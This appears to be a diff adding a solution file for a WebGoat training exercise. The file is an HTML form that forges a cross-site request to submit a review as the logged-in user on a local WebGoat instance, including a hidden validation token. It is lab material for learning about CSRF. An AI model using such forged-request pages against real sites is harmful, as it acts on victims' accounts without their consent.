@@ -1,0 +1,16 @@
+<!-- The page below simulates a comment/review page.
+The difference here is that you have to initiate the submission elsewhere as you might with a CSRF attack and like the previous exercise.
+It’s easier than you think. In most cases, the trickier part is finding somewhere that you want to execute the CSRF attack.
+The classic example is account/wire transfers in someone’s bank account.
+But we’re keeping it simple here. In this case, you just need to trigger a review submission on behalf of the currently logged in user. -->
+
+<html>
+<body>
+ <form action="http://127.0.0.1:8080/WebGoat/csrf/review" method="POST" enctype="application/x-www-form-urlencoded; charset=UTF-8"> 
+  <input name="reviewText" value="test" type="hidden">
+  <input name="stars" type="hidden" value="1">
+  <input name="validateReq" type="hidden" value="2aa14227b9a13d0bede0388a7fba9aa9">
+  <input type="submit" value="Submit">
+ </form>
+</body>
+</html>
